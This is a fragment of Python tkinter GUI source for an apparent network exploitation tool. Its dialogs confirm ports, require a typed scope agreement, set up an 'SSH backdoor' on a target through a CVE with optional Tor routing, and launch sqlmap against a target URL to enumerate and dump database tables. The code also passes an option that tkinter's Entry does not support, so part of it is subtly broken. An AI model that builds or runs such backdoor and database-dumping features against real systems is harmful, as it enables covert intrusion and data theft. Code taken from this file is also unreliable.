        def select_none():
            for v in self._vars.values(): v.set(False)
        tk.Button(ctrl_f, text="ALL", font=("Courier New", 8),
            bg=th["BG3"], fg=th["FG2"], relief="flat", bd=0,
            padx=8, pady=2, cursor="hand2", command=select_all
        ).pack(side="left", padx=(0, 4))
        tk.Button(ctrl_f, text="NONE", font=("Courier New", 8),
            bg=th["BG3"], fg=th["FG2"], relief="flat", bd=0,
            padx=8, pady=2, cursor="hand2", command=select_none
        ).pack(side="left")

        tk.Frame(win, bg=th["BORDER"], height=1).pack(fill="x", padx=20, pady=(8, 0))

        # Action buttons
        btnf = tk.Frame(win, bg=th["BG"])
        btnf.pack(fill="x", padx=20, pady=(8, 16))

        def start():
            selected = {k: v.get() for k, v in self._vars.items()}
            ask = self._ask_var.get()
            SETTINGS["deep_tools"]  = selected
            SETTINGS["ask_per_port"] = ask
            save_settings(SETTINGS)
            win.destroy()
            on_start(selected, ask)

        tk.Button(btnf, text=t("tool_sel_cancel"),
            font=("Courier New", 10), bg=th["BG3"], fg=th["FG2"],
            relief="flat", bd=0, padx=18, pady=8, cursor="hand2",
            command=win.destroy
        ).pack(side="right", padx=(8, 0))

        tk.Button(btnf, text=t("tool_sel_ok"),
            font=("Courier New", 10, "bold"),
            bg=th["BTN_BG"], fg=th["BTN_FG"],
            activebackground=th["BTN_HOV"],
            relief="flat", bd=0, padx=20, pady=8, cursor="hand2",
            command=start
        ).pack(side="right")

        def _fade(a):
            try: win.attributes("-alpha", min(0.97, a))
            except: pass
            if a < 0.97: win.after(14, lambda: _fade(a + 0.08))
        _fade(0.0)


# ═══════════════════════════════════════════════════════════════
# GUI — PORT CONFIRMATION DIALOG
# ═══════════════════════════════════════════════════════════════
class PortConfirmResult:
    """Thread-safe result holder for port confirmation dialog."""
    def __init__(self):
        self._event  = threading.Event()
        self._result = "yes"

    def wait(self):
        self._event.wait(timeout=30)
        return self._result

    def set(self, val):
        self._result = val
        self._event.set()


def ask_port_gui(parent, port, service, cves) -> str:
    """Called from scan thread via root.after — returns 'yes'/'skip'/'all'."""
    result = PortConfirmResult()
    import tkinter as tk

    def show():
        th  = get_theme()
        win = tk.Toplevel(parent)
        win.title(t("port_ask_title"))
        win.configure(bg=th["BG"])
        win.resizable(False, False)
        win.transient(parent)
        win.grab_set()

        sw = win.winfo_screenwidth(); sh = win.winfo_screenheight()
        W, H = 460, 320
        win.geometry(f"{W}x{H}+{(sw-W)//2}+{(sh-H)//2}")
        try:
            win.update_idletasks()  # removed wait_visibility (hangs on Wayland)
            win.attributes("-alpha", 0.0)
        except: pass

        tk.Label(win, text=t("port_ask_title"),
            font=("Georgia", 12, "bold italic"), bg=th["BG"], fg=th["LOGO_CLR"]
        ).pack(pady=(16, 4))

        info_f = tk.Frame(win, bg=th["BG2"])
        info_f.pack(fill="x", padx=20, pady=(0, 8))
        tk.Label(info_f, text=f"  PORT  {port}/tcp  →  {service}",
            font=("Courier New", 12, "bold"), bg=th["BG2"], fg=th["ACC"]
        ).pack(anchor="w", pady=6)

        if cves:
            tk.Label(info_f, text=f"  {len(cves)} CVE(s) found for this service:",
                font=("Courier New", 9), bg=th["BG2"], fg=th["WARN"]
            ).pack(anchor="w", padx=4)
            for cid, desc in cves[:3]:
                tk.Label(info_f, text=f"    ⚡ {cid}: {desc[:45]}",
                    font=("Courier New", 8), bg=th["BG2"], fg=th["FG2"]
                ).pack(anchor="w", padx=8)

        tk.Label(win, text="Analyze this port?",
            font=("Courier New", 10), bg=th["BG"], fg=th["FG"]
        ).pack(pady=(8, 4))

        btnf = tk.Frame(win, bg=th["BG"])
        btnf.pack(pady=8)

        def do(val):
            win.destroy()
            result.set(val)

        tk.Button(btnf, text=t("port_ask_yes"),
            font=("Courier New", 10, "bold"),
            bg=th["ACC3"], fg=th["BG"],
            relief="flat", bd=0, padx=16, pady=7, cursor="hand2",
            command=lambda: do("yes")
        ).pack(side="left", padx=4)
        tk.Button(btnf, text=t("port_ask_no"),
            font=("Courier New", 10),
            bg=th["BG3"], fg=th["FG2"],
            relief="flat", bd=0, padx=16, pady=7, cursor="hand2",
            command=lambda: do("skip")
        ).pack(side="left", padx=4)
        tk.Button(btnf, text=t("port_ask_all"),
            font=("Courier New", 9),
            bg=th["BG4"], fg=th["FG3"],
            relief="flat", bd=0, padx=12, pady=7, cursor="hand2",
            command=lambda: do("all")
        ).pack(side="left", padx=4)

        win.protocol("WM_DELETE_WINDOW", lambda: do("yes"))

        def _fade(a):
            try: win.attributes("-alpha", min(0.97, a))
            except: pass
            if a < 0.97: win.after(14, lambda: _fade(a + 0.08))
        _fade(0.0)

    parent.after(0, show)
    return result.wait()



# ═══════════════════════════════════════════════════════════════
# GUI — SCOPE AGREEMENT DIALOG (for CVE exploit confirmation)
# ═══════════════════════════════════════════════════════════════
class ScopeAgreementDialog:
    """Shows scope agreement and requires user to type 'I accept'."""
    def __init__(self, parent, cve_id, cve_desc, target, on_accept):
        import tkinter as tk
        th  = get_theme()
        win = tk.Toplevel(parent)
        self.win = win
        win.title("Scope Agreement Required")
        win.configure(bg=th["BG"])
        win.resizable(False, False)
        win.transient(parent)
        win.grab_set()

        sw = win.winfo_screenwidth(); sh = win.winfo_screenheight()
        W, H = 560, 460
        win.geometry(f"{W}x{H}+{(sw-W)//2}+{(sh-H)//2}")
        try:
            win.update_idletasks()
            win.attributes("-alpha", 0.0)
        except: pass

        # Title
        tk.Label(win, text="⚠  SCOPE AGREEMENT REQUIRED",
            font=("Courier New", 13, "bold"), bg=th["BG"], fg=th["ERR"]
        ).pack(pady=(18, 4))

        # CVE info card
        cf = tk.Frame(win, bg=th["BG3"], bd=0)
        cf.pack(fill="x", padx=20, pady=8)
        tk.Label(cf, text=f"  Exploit Target:  {target}",
            font=("Courier New", 10), bg=th["BG3"], fg=th["FG"], anchor="w"
        ).pack(fill="x", padx=6, pady=(8, 2))
        tk.Label(cf, text=f"  CVE:             {cve_id}",
            font=("Courier New", 10, "bold"), bg=th["BG3"], fg=th["ERR"], anchor="w"
        ).pack(fill="x", padx=6, pady=2)
        tk.Label(cf, text=f"  {cve_desc[:68]}",
            font=("Courier New", 9), bg=th["BG3"], fg=th["FG2"], anchor="w",
            wraplength=500
        ).pack(fill="x", padx=6, pady=(2, 8))

        # Terms text
        terms = tk.Text(win, font=("Courier New", 9), bg=th["BG2"], fg=th["FG"],
            relief="flat", bd=0, padx=14, pady=10, height=10, wrap="word",
            state="normal", cursor="arrow")
        terms.pack(fill="x", padx=20, pady=(0, 8))
        terms.insert("1.0",
            "LEGAL NOTICE \u2014 Exploit Mode\n\n"
            "By proceeding, you confirm:\n\n"
            "  1. You have a signed Scope Agreement / written authorization\n"
            "     from the system owner for the target above.\n\n"
            "  2. You are targeting ONLY systems explicitly listed in scope.\n\n"
            "  3. You understand that unauthorized exploitation is a CRIMINAL\n"
            "     OFFENSE under CFAA (USA), CMA (UK), and equivalent laws.\n\n"
            "  4. YOU bear full legal and ethical responsibility for all actions.\n\n"
            "Type exactly:  I accept\n"
            "to confirm authorization and proceed."
        )
        terms.config(state="disabled")

        # Input field
        inp_f = tk.Frame(win, bg=th["BG2"], padx=2, pady=2)
        inp_f.pack(padx=20, pady=(0, 6))
        self._var = tk.StringVar()
        inp = tk.Entry(inp_f, textvariable=self._var,
            font=("Courier New", 12, "bold"),
            bg=th["BG3"], fg=th["WHITE"],
            insertbackground=th["WHITE"],
            relief="flat", bd=6, width=28)
        inp.pack()
        inp.focus_set()

        # Buttons
        bf = tk.Frame(win, bg=th["BG"])
        bf.pack(fill="x", padx=20, pady=(4, 16))

        def _cancel():
            win.destroy()
        def _accept():
            if self._var.get().strip().lower() == "i accept":
                win.destroy()
                on_accept()
            else:
                inp_f.config(bg=th["ERR"])
                win.after(400, lambda: inp_f.config(bg=th["BG2"]))
                self._var.set("")
                inp.focus_set()

        tk.Button(bf, text="CANCEL",
            font=("Courier New", 10), bg=th["BG3"], fg=th["FG2"],
            relief="flat", bd=0, padx=18, pady=8, cursor="hand2",
            command=_cancel
        ).pack(side="right", padx=(8, 0))

        self._accept_btn = tk.Button(bf,
            text="PROCEED WITH EXPLOIT",
            font=("Courier New", 10, "bold"),
            bg=th["ERR"], fg=th["WHITE"],
            relief="flat", bd=0, padx=18, pady=8, cursor="hand2",
            command=_accept
        )
        self._accept_btn.pack(side="right")
        inp.bind("<Return>", lambda _: _accept())

        def _fade(a):
            try: win.attributes("-alpha", min(0.96, a))
            except: pass
            if a < 0.96: win.after(14, lambda: _fade(a + 0.08))
        _fade(0.0)


# ═══════════════════════════════════════════════════════════════
# GUI — SSH BACKDOOR SETUP DIALOG
# ═══════════════════════════════════════════════════════════════
class SSHBackdoorDialog:
    """Collect SSH credentials and TOR bridge config for exploit."""
    def __init__(self, parent, target, cve_id, on_start):
        import tkinter as tk
        th  = get_theme()
        win = tk.Toplevel(parent)
        self.win = win
        win.title("SSH Access Attempt — Exploit Config")
        win.configure(bg=th["BG"])
        win.resizable(False, False)
        win.transient(parent)
        win.grab_set()

        sw = win.winfo_screenwidth(); sh = win.winfo_screenheight()
        W, H = 520, 440
        win.geometry(f"{W}x{H}+{(sw-W)//2}+{(sh-H)//2}")
        try:
            win.update_idletasks()
            win.attributes("-alpha", 0.0)
        except: pass

        tk.Label(win, text="SSH Backdoor Configuration",
            font=("Georgia", 13, "bold italic"), bg=th["BG"], fg=th["LOGO_CLR"]
        ).pack(pady=(16, 2))
        tk.Label(win,
            text=f"  Target: {target}  |  {cve_id}",
            font=("Courier New", 9), bg=th["BG"], fg=th["FG3"]
        ).pack(pady=(0, 8))
        tk.Frame(win, bg=th["BORDER"], height=1).pack(fill="x", padx=20)

        def _field(parent, label, show=""):
            row = tk.Frame(parent, bg=th["BG"])
            row.pack(fill="x", padx=20, pady=4)
            tk.Label(row, text=f"{label:<22}",
                font=("Courier New", 9), bg=th["BG"], fg=th["FG3"], anchor="w"
            ).pack(side="left")
            var = tk.StringVar()
            ef = tk.Frame(row, bg=th["BORDER2"], padx=1, pady=1)
            ef.pack(side="left", fill="x", expand=True)
            e = tk.Entry(ef, textvariable=var,
                font=("Courier New", 11),
                bg=th["BG3"], fg=th["FG"],
                insertbackground=th["WHITE"],
                relief="flat", bd=4,
                show=show
            )
            e.pack(fill="x")
            return var, e

        tk.Label(win, text="  New SSH credentials to create on target:",
            font=("Courier New", 9, "bold"), bg=th["BG"], fg=th["FG2"], anchor="w"
        ).pack(fill="x", padx=20, pady=(12, 2))

        self._usr_var, self._usr_e = _field(win, "SSH Username:")
        self._pwd_var, self._pwd_e = _field(win, "SSH Password:", show="●")

        tk.Frame(win, bg=th["BORDER"], height=1).pack(fill="x", padx=20, pady=8)

        # TOR section
        self._tor_var = tk.BooleanVar(value=False)
        tor_f = tk.Frame(win, bg=th["BG"])
        tor_f.pack(fill="x", padx=20, pady=2)
        tk.Checkbutton(tor_f,
            text="Route via TOR (paste bridge below)",
            variable=self._tor_var,
            font=("Courier New", 9),
            bg=th["BG"], fg=th["FG2"],
            selectcolor=th["BG3"],
            activebackground=th["BG"],
            relief="flat", bd=0, cursor="hand2",
            command=self._toggle_tor
        ).pack(side="left")

        self._bridge_frame = tk.Frame(win, bg=th["BG"])
        self._bridge_frame.pack(fill="x", padx=20, pady=(2, 0))
        tk.Label(self._bridge_frame,
            text="TOR Bridge (obfs4/webtunnel/snowflake):",
            font=("Courier New", 8), bg=th["BG"], fg=th["FG3"], anchor="w"
        ).pack(anchor="w")
        self._bridge_var = tk.StringVar()
        bridge_ef = tk.Frame(self._bridge_frame, bg=th["BORDER2"], padx=1, pady=1)
        bridge_ef.pack(fill="x")
        self._bridge_e = tk.Entry(bridge_ef, textvariable=self._bridge_var,
            font=("Courier New", 9),
            bg=th["BG3"], fg=th["FG"],
            insertbackground=th["WHITE"],
            relief="flat", bd=4,
            placeholder_text="obfs4 bridge.example.com:443 ..."
        )
        self._bridge_e.pack(fill="x")
        self._bridge_frame.pack_forget()

        tk.Label(win,
            text="  The exploit will attempt to add this SSH user via the CVE.",
            font=("Courier New", 8), bg=th["BG"], fg=th["FG3"]
        ).pack(anchor="w", padx=20, pady=(8, 0))

        # Buttons
        tk.Frame(win, bg=th["BORDER"], height=1).pack(fill="x", padx=20, pady=(10, 0))
        bf = tk.Frame(win, bg=th["BG"])
        bf.pack(fill="x", padx=20, pady=(8, 16))

        def _start():
            user = self._usr_var.get().strip()
            pwd  = self._pwd_var.get().strip()
            if not user or not pwd:
                self._usr_e.config(bg=th["ERR"])
                win.after(400, lambda: self._usr_e.config(bg=th["BG3"]))
                return
            bridge = self._bridge_var.get().strip() if self._tor_var.get() else ""
            win.destroy()
            on_start(user, pwd, bridge)

        tk.Button(bf, text="CANCEL",
            font=("Courier New", 10), bg=th["BG3"], fg=th["FG2"],
            relief="flat", bd=0, padx=18, pady=8, cursor="hand2",
            command=win.destroy
        ).pack(side="right", padx=(8, 0))
        tk.Button(bf, text="LAUNCH EXPLOIT",
            font=("Courier New", 10, "bold"),
            bg="#a80000", fg=th["WHITE"],
            relief="flat", bd=0, padx=18, pady=8, cursor="hand2",
            command=_start
        ).pack(side="right")

        def _fade(a):
            try: win.attributes("-alpha", min(0.96, a))
            except: pass
            if a < 0.96: win.after(14, lambda: _fade(a + 0.08))
        _fade(0.0)

    def _toggle_tor(self):
        if self._tor_var.get():
            self._bridge_frame.pack(fill="x", padx=20, pady=(2, 0))
        else:
            self._bridge_frame.pack_forget()


# ═══════════════════════════════════════════════════════════════
# GUI — SQLMAP DATABASE DUMP DIALOG
# ═══════════════════════════════════════════════════════════════
class SQLMapDumpDialog:
    """Interactive SQLMap dump: select database → table → dump."""
    def __init__(self, parent, target, databases, on_dump):
        import tkinter as tk
        th  = get_theme()
        win = tk.Toplevel(parent)
        self.win = win
        self._parent = parent
        self._target = target
        self._on_dump = on_dump
        win.title("SQLMap — Database Dump")
        win.configure(bg=th["BG"])
        win.resizable(False, True)
        win.transient(parent)
        win.grab_set()

        sw = win.winfo_screenwidth(); sh = win.winfo_screenheight()
        W, H = 500, 420
        win.geometry(f"{W}x{H}+{(sw-W)//2}+{(sh-H)//2}")
        try:
            win.update_idletasks()
            win.attributes("-alpha", 0.0)
        except: pass

        tk.Label(win, text="SQLMap — Interactive Dump",
            font=("Georgia", 13, "bold italic"), bg=th["BG"], fg=th["LOGO_CLR"]
        ).pack(pady=(16, 2))
        tk.Label(win, text=f"Target: {target}",
            font=("Courier New", 9), bg=th["BG"], fg=th["FG3"]
        ).pack()
        tk.Frame(win, bg=th["BORDER"], height=1).pack(fill="x", padx=20, pady=8)

        tk.Label(win, text="  Detected Databases:",
            font=("Courier New", 9, "bold"), bg=th["BG"], fg=th["FG2"], anchor="w"
        ).pack(fill="x", padx=20)

        self._db_var = tk.StringVar()
        db_frame = tk.Frame(win, bg=th["BG2"])
        db_frame.pack(fill="x", padx=20, pady=4)
        db_scroll = tk.Scrollbar(db_frame, orient="vertical")
        self._db_list = tk.Listbox(db_frame, font=("Courier New", 11),
            bg=th["BG3"], fg=th["FG"], selectbackground=th["ACC"],
            selectforeground=th["BG"], relief="flat", bd=0,
            yscrollcommand=db_scroll.set, height=6)
        db_scroll.config(command=self._db_list.yview)
        self._db_list.pack(side="left", fill="x", expand=True)
        db_scroll.pack(side="right", fill="y")

        for db in databases:
            self._db_list.insert("end", f"  {db}")

        tk.Label(win, text="  Select table to dump (after choosing DB):",
            font=("Courier New", 9, "bold"), bg=th["BG"], fg=th["FG2"], anchor="w"
        ).pack(fill="x", padx=20, pady=(8, 2))

        self._tbl_var = tk.StringVar()
        tbl_frame = tk.Frame(win, bg=th["BG2"])
        tbl_frame.pack(fill="x", padx=20, pady=4)
        tbl_scroll = tk.Scrollbar(tbl_frame, orient="vertical")
        self._tbl_list = tk.Listbox(tbl_frame, font=("Courier New", 11),
            bg=th["BG3"], fg=th["FG"], selectbackground=th["ACC2"],
            selectforeground=th["BG"], relief="flat", bd=0,
            yscrollcommand=tbl_scroll.set, height=4)
        tbl_scroll.config(command=self._tbl_list.yview)
        self._tbl_list.pack(side="left", fill="x", expand=True)
        tbl_scroll.pack(side="right", fill="y")

        tk.Label(win, text="  (click DB first, then fetch tables, then pick table)",
            font=("Courier New", 8), bg=th["BG"], fg=th["FG3"]
        ).pack(anchor="w", padx=20)

        # Buttons
        tk.Frame(win, bg=th["BORDER"], height=1).pack(fill="x", padx=20, pady=(8, 0))
        bf = tk.Frame(win, bg=th["BG"])
        bf.pack(fill="x", padx=20, pady=(8, 16))

        tk.Button(bf, text="CLOSE",
            font=("Courier New", 10), bg=th["BG3"], fg=th["FG2"],
            relief="flat", bd=0, padx=14, pady=7, cursor="hand2",
            command=win.destroy
        ).pack(side="right", padx=(8, 0))

        tk.Button(bf, text="DUMP TABLE",
            font=("Courier New", 10, "bold"),
            bg=th["ERR"], fg=th["WHITE"],
            relief="flat", bd=0, padx=14, pady=7, cursor="hand2",
            command=self._do_dump
        ).pack(side="right")

        tk.Button(bf, text="FETCH TABLES",
            font=("Courier New", 10),
            bg=th["BG4"], fg=th["FG2"],
            relief="flat", bd=0, padx=14, pady=7, cursor="hand2",
            command=self._fetch_tables
        ).pack(side="right", padx=(0, 8))

        def _fade(a):
            try: win.attributes("-alpha", min(0.96, a))
            except: pass
            if a < 0.96: win.after(14, lambda: _fade(a + 0.08))
        _fade(0.0)

    def _fetch_tables(self):
        sel = self._db_list.curselection()
        if not sel:
            return
        db = self._db_list.get(sel[0]).strip()
        self._tbl_list.delete(0, "end")
        self._tbl_list.insert("end", "  Fetching tables…")
        import threading
        def _worker():
            tables = []
            try:
                import subprocess
                r = subprocess.run(
                    ["sqlmap", "-u", f"http://{self._target}/?id=1",
                     "--batch", f"--tables", f"-D", db,
                     "--output-dir=/tmp/sqlmap_wg"],
                    capture_output=True, text=True, timeout=120
                )
                for line in r.stdout.split("\n"):
                    m = re.match(r'\|\s+(\w+)\s+\|', line.strip())
                    if m:
                        tables.append(m.group(1))
            except Exception as e:
                tables = [f"Error: {e}"]
            def _update():
                self._tbl_list.delete(0, "end")
                for t in tables or ["(no tables found)"]:
                    self._tbl_list.insert("end", f"  {t}")
            try: self._parent.after(0, _update)
            except: pass
        threading.Thread(target=_worker, daemon=True).start()

    def _do_dump(self):
        db_sel  = self._db_list.curselection()
        tbl_sel = self._tbl_list.curselection()
        if not db_sel:
            return
        db  = self._db_list.get(db_sel[0]).strip()
        tbl = self._tbl_list.get(tbl_sel[0]).strip() if tbl_sel else None
        self.win.destroy()
        self._on_dump(db, tbl)


# ═══════════════════════════════════════════════════════════════
# GUI — CVE EXPLOIT OFFER DIALOG
# ═══════════════════════════════════════════════════════════════
class CVEExploitOfferDialog:
    """After CVE found — offer to attempt SSH exploit."""
    def __init__(self, parent, target, cve_id, cve_desc, on_yes):
        import tkinter as tk
        th  = get_theme()
        win = tk.Toplevel(parent)
        self.win = win
        win.title("Exploit Opportunity Detected")
        win.configure(bg=th["BG"])
        win.resizable(False, False)
        win.transient(parent)
        win.grab_set()

        sw = win.winfo_screenwidth(); sh = win.winfo_screenheight()
        W, H = 520, 320
        win.geometry(f"{W}x{H}+{(sw-W)//2}+{(sh-H)//2}")
        try:
            win.update_idletasks()
            win.attributes("-alpha", 0.0)
        except: pass

        # Animated header
        hdr = tk.Canvas(win, bg=th["BG"], height=50, highlightthickness=0)
        hdr.pack(fill="x")
        hdr.create_text(260, 28,
            text="⚡  EXPLOIT OPPORTUNITY DETECTED",
            font=("Courier New", 14, "bold"), fill=th["ERR"])

        cf = tk.Frame(win, bg=th["BG3"])
        cf.pack(fill="x", padx=20, pady=6)
        tk.Label(cf, text=f"  Target   : {target}",
            font=("Courier New", 10), bg=th["BG3"], fg=th["FG"], anchor="w"
        ).pack(fill="x", padx=8, pady=(8, 2))
        tk.Label(cf, text=f"  CVE      : {cve_id}",
            font=("Courier New", 10, "bold"), bg=th["BG3"], fg=th["ERR"], anchor="w"
        ).pack(fill="x", padx=8, pady=2)
        tk.Label(cf, text=f"  {cve_desc[:72]}",
            font=("Courier New", 9), bg=th["BG3"], fg=th["WARN"], anchor="w",
            wraplength=480
        ).pack(fill="x", padx=8, pady=(2, 8))

        tk.Label(win,
            text="This CVE allows Remote Code Execution.\n"
                 "Attempt to establish SSH access via this exploit?",
            font=("Courier New", 10), bg=th["BG"], fg=th["FG"],
            justify="center"
        ).pack(pady=(8, 4))

        bf = tk.Frame(win, bg=th["BG"])
        bf.pack(pady=(4, 16))

        def _no():
            win.destroy()
        def _yes():
            win.destroy()
            on_yes()

        tk.Button(bf, text="SKIP",
            font=("Courier New", 10), bg=th["BG3"], fg=th["FG2"],
            relief="flat", bd=0, padx=18, pady=9, cursor="hand2",
            command=_no
        ).pack(side="left", padx=8)
        tk.Button(bf, text="YES — TRY SSH EXPLOIT",
            font=("Courier New", 11, "bold"),
            bg=th["ERR"], fg=th["WHITE"],
            relief="flat", bd=0, padx=18, pady=9, cursor="hand2",
            command=_yes
        ).pack(side="left", padx=8)

        def _fade(a):
            try: win.attributes("-alpha", min(0.96, a))
            except: pass
            if a < 0.96: win.after(14, lambda: _fade(a + 0.08))
        _fade(0.0)


# ═══════════════════════════════════════════════════════════════
# GUI — SETTINGS DIALOG
# ═══════════════════════════════════════════════════════════════
class SettingsDialog:
    def __init__(self, parent, on_apply):
        import tkinter as tk
        from tkinter import colorchooser
        th  = get_theme()
        win = tk.Toplevel(parent)
        win.title(t("settings_title"))
        win.configure(bg=th["BG"])
        win.resizable(False, False)
        win.transient(parent)
        win.grab_set()

        sw = win.winfo_screenwidth(); sh = win.winfo_screenheight()
        W, H = 420, 520
        win.geometry(f"{W}x{H}+{(sw-W)//2}+{(sh-H)//2}")
        try:
            win.update_idletasks()  # removed wait_visibility (hangs on Wayland)
            win.attributes("-alpha", 0.0)
        except: pass

        tk.Label(win, text=t("settings_title"),
            font=("Georgia", 14, "bold italic"), bg=th["BG"], fg=th["LOGO_CLR"]
        ).pack(pady=(18, 6))
        tk.Frame(win, bg=th["BORDER"], height=1).pack(fill="x", padx=24, pady=(0, 12))

        body = tk.Frame(win, bg=th["BG"])
        body.pack(fill="both", expand=True, padx=28)

        def row(label, widget_cb):
            f = tk.Frame(body, bg=th["BG"]); f.pack(fill="x", pady=7)
            tk.Label(f, text=label, font=("Courier New", 10),
                bg=th["BG"], fg=th["FG2"], width=18, anchor="w"
            ).pack(side="left")
            return f

        # Language
        lang_f  = row(t("lang_label"), None)
        lang_var = tk.StringVar(value=SETTINGS["lang"])
        for lng in ("EN", "RU"):
            tk.Radiobutton(lang_f, text=lng, variable=lang_var, value=lng,
                font=("Courier New", 10), bg=th["BG"], fg=th["FG"],
                selectcolor=th["BG3"], activebackground=th["BG"],
                relief="flat"
            ).pack(side="left", padx=6)

        # Theme
        theme_f   = row(t("theme_label"), None)
        theme_var = tk.StringVar(value=SETTINGS["theme"])
        theme_cb  = tk.OptionMenu(theme_f, theme_var,
            *[n for n in THEME_ORDER if n != "custom"])
        theme_cb.config(font=("Courier New", 9),
            bg=th["BG3"], fg=th["FG"], relief="flat",
            activebackground=th["BORDER2"], bd=0,
            highlightthickness=0)
        theme_cb["menu"].config(bg=th["BG3"], fg=th["FG"])
        theme_cb.pack(side="left")

        # Sound
        sound_f   = row(t("sound_label"), None)
        sound_var = tk.BooleanVar(value=SETTINGS.get("sound", True))
        tk.Checkbutton(sound_f, text="ON", variable=sound_var,
            font=("Courier New", 10), bg=th["BG"], fg=th["FG"],
            selectcolor=th["BG3"], activebackground=th["BG"],
            relief="flat"
        ).pack(side="left")

        # Transparency
        alpha_f   = row(t("alpha_label"), None)
        alpha_var = tk.DoubleVar(value=SETTINGS.get("transparency", 0.93))
        alpha_lbl = tk.Label(alpha_f, text=f"{alpha_var.get():.2f}",
            font=("Courier New", 9), bg=th["BG"], fg=th["FG2"], width=5)

        def on_alpha(v):
            val = round(float(v), 2)
            alpha_var.set(val)
            alpha_lbl.config(text=f"{val:.2f}")
            try:
                parent.attributes("-alpha", val)
            except: pass

        alpha_scale = tk.Scale(alpha_f, from_=0.4, to=1.0,
            resolution=0.01, orient="horizontal",
            variable=alpha_var, command=on_alpha,
            font=("Courier New", 8), bg=th["BG"], fg=th["FG"],
            troughcolor=th["BG3"], sliderrelief="flat",
            activebackground=th["BORDER2"],
            highlightthickness=0, bd=0, length=160)
        alpha_scale.pack(side="left")
        alpha_lbl.pack(side="left", padx=6)

        # Ask per port
        ask_f   = row(t("ask_port_label"), None)
        ask_var = tk.BooleanVar(value=SETTINGS.get("ask_per_port", False))
        tk.Checkbutton(ask_f, text="ON", variable=ask_var,
            font=("Courier New", 10), bg=th["BG"], fg=th["FG"],
            selectcolor=th["BG3"], activebackground=th["BG"],
            relief="flat"
        ).pack(side="left")

        # Custom colors button
        def pick_custom():
            color = colorchooser.askcolor(
                color=th.get("ACC","#4a9eff"), parent=win)[1]
            if color:
                SETTINGS["custom_theme"] = {"ACC": color}
                save_settings(SETTINGS)

        tk.Button(body, text=t("custom_btn"),
            font=("Courier New", 9), bg=th["BG3"], fg=th["FG2"],
            relief="flat", bd=0, padx=12, pady=5, cursor="hand2",
            command=pick_custom
        ).pack(anchor="w", pady=(8, 0))

        tk.Frame(win, bg=th["BORDER"], height=1).pack(fill="x", padx=24, pady=10)

        # Buttons
        btnf = tk.Frame(win, bg=th["BG"])
        btnf.pack(pady=(0, 16))

        def save():
            SETTINGS["lang"]         = lang_var.get()
            SETTINGS["theme"]        = theme_var.get()
            SETTINGS["sound"]        = sound_var.get()
            SETTINGS["transparency"] = round(alpha_var.get(), 2)
            SETTINGS["ask_per_port"] = ask_var.get()
            save_settings(SETTINGS)
            win.destroy()
            on_apply(animated=True)

        tk.Button(btnf, text=t("close_btn"),
            font=("Courier New", 10), bg=th["BG3"], fg=th["FG2"],
            relief="flat", bd=0, padx=18, pady=7, cursor="hand2",
            command=win.destroy
        ).pack(side="right", padx=(8, 0))
        tk.Button(btnf, text=t("save_btn"),
            font=("Courier New", 10, "bold"),
            bg=th["BTN_BG"], fg=th["BTN_FG"],
            activebackground=th["BTN_HOV"],
            relief="flat", bd=0, padx=20, pady=7, cursor="hand2",
            command=save
        ).pack(side="right")

        def _fade(a):
            try: win.attributes("-alpha", min(0.97, a))
            except: pass
            if a < 0.97: win.after(14, lambda: _fade(a + 0.08))
        _fade(0.0)


# ═══════════════════════════════════════════════════════════════
# GUI — SURFACE PANEL (slides from bottom after surface scan)
# ═══════════════════════════════════════════════════════════════
class SurfacePanel:
    """Animated panel that slides up from the bottom with surface analysis."""
    def __init__(self, parent, results: dict, domain: str, on_deep=None):
        import tkinter as tk
        th   = get_theme()
        self._th = th

        win = tk.Toplevel(parent)
        self.win = win
        win.title(t("summary_title"))
        win.configure(bg=th["BG"])
        win.overrideredirect(True)
        win.attributes("-topmost", True)

        sw = win.winfo_screenwidth()
        sh = win.winfo_screenheight()
        W  = min(sw - 80, 980)
        H  = 340

        # Position: bottom center
        x = (sw - W) // 2
        target_y = sh - H - 40

        win.geometry(f"{W}x{H}+{x}+{sh}")  # Start off-screen
        try:
            win.update_idletasks()  # removed wait_visibility (hangs on Wayland)
            win.attributes("-alpha", 0.0)
        except: pass

        # ── Build content ──────────────────────────────────────
        # Top bar
        top = tk.Frame(win, bg=th["BG3"], height=36)
        top.pack(fill="x")
        top.pack_propagate(False)
        tk.Label(top, text=f"  ▲  {t('summary_title')}  —  {domain}",
            font=("Courier New", 9, "bold"), bg=th["BG3"], fg=th["LOGO_CLR"]
        ).pack(side="left", padx=10, pady=8)
        tk.Button(top, text="✕",
            font=("Courier New", 11), bg=th["BG3"], fg=th["FG3"],
            relief="flat", bd=0, cursor="hand2",
            command=lambda: self._slide_out(sh)
        ).pack(side="right", padx=10)

        # Content area — 4 columns
        body = tk.Frame(win, bg=th["BG"])
        body.pack(fill="both", expand=True, padx=12, pady=8)

        # Column helper
        def col(parent, weight=1):
            f = tk.Frame(parent, bg=th["BG2"], bd=0)
            f.pack(side="left", fill="both", expand=True,
                   padx=4, pady=4, ipadx=8, ipady=6)
            return f

        def kv(parent, key, val, vcolor=None):
            r = tk.Frame(parent, bg=th["BG2"])
            r.pack(fill="x", pady=1, padx=8)
            tk.Label(r, text=f"{key:<14}", font=("Courier New", 8),
                bg=th["BG2"], fg=th["FG3"], anchor="w"
            ).pack(side="left")
            tk.Label(r, text=str(val)[:34], font=("Courier New", 9, "bold"),
                bg=th["BG2"], fg=vcolor or th["FG"], anchor="w"
            ).pack(side="left")

        # ── Col 1: Server / OS info ───────────────────────────
        c1 = col(body)
        tk.Label(c1, text="SERVER INFO", font=("Courier New", 8, "bold"),
            bg=th["BG2"], fg=th["ACC"]
        ).pack(anchor="w", padx=8, pady=(4, 2))

        server = results.get("http", {}).get("server", "N/A")
        status = results.get("http", {}).get("status_code", "N/A")
        proto  = results.get("http", {}).get("protocol", "N/A")
        techs  = results.get("http", {}).get("technologies", [])

        kv(c1, "Server",  server or "Unknown",  th["FOUND"] if server else th["FG2"])
        kv(c1, "Status",  status,  th["ACC3"] if str(status) == "200" else th["WARN"])
        kv(c1, "Proto",   proto,   th["ACC3"] if proto == "HTTPS" else th["WARN"])
        for tech in techs[:3]:
            kv(c1, "Tech", tech[:30], th["FG"])

        # Guess OS from server header
        os_guess = "Unknown"
        if server:
            sl = server.lower()
            if "ubuntu" in sl or "debian" in sl: os_guess = "Linux (Debian/Ubuntu)"
            elif "centos" in sl or "rhel" in sl:  os_guess = "Linux (RHEL/CentOS)"
            elif "win" in sl or "iis" in sl:       os_guess = "Windows Server"
            elif "freebsd" in sl:                   os_guess = "FreeBSD"
            elif "nginx" in sl:                     os_guess = "Linux (nginx)"
            elif "apache" in sl:                    os_guess = "Linux (Apache)"
